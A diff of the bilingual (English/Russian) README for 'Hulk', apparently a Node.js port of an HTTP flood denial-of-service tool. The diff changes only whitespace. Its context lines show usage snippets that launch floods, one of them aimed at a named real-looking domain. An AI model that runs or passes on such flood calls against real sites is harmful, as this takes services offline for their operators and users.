@@ -1,4 +1,5 @@
-﻿﻿# Hulk v1.0.0
+﻿﻿
+# Hulk v1.0.0
 DoS Attack tools (for testing purposes only)
 
 ## EN
@@ -36,7 +37,7 @@ Rewritten with python (concept) under nodejs, optimized by Siarhei Dudko
 		var hulkFile = require(__dirname + '/index.js').file;
 		hulkFile('http://link.com', '', 'GET', 20, 100, __dirname + '/test.log');
 	```
-      - hulk.func - function for working with callback function (return the output array of the console to callback)
+  - hulk.func - function for working with callback function (return the output array of the console to callback)
 	```
 		var hulkFunc = require(__dirname + '/index.js').func;
 		hulkFunc('http://alenmoroz.tk/', '', 'GET', 20, 100, console.log);
@@ -125,7 +126,7 @@ Rewritten with python (concept) under nodejs, optimized by Siarhei Dudko
 		var hulkFile = require(__dirname + '/index.js').file;
 		hulkFile('http://link.com', '', 'GET', 20, 100, __dirname + '/test.log');
 	```
-    - hulk.func - функция для работы с каллбэк-функцией (вернет массив вывода консоли в каллбэк)
+  - hulk.func - функция для работы с каллбэк-функцией (вернет массив вывода консоли в каллбэк)
 	```
 		var hulkFunc = require(__dirname + '/index.js').func;
 		hulkFunc('http://alenmoroz.tk/', '', 'GET', 20, 100, console.log);
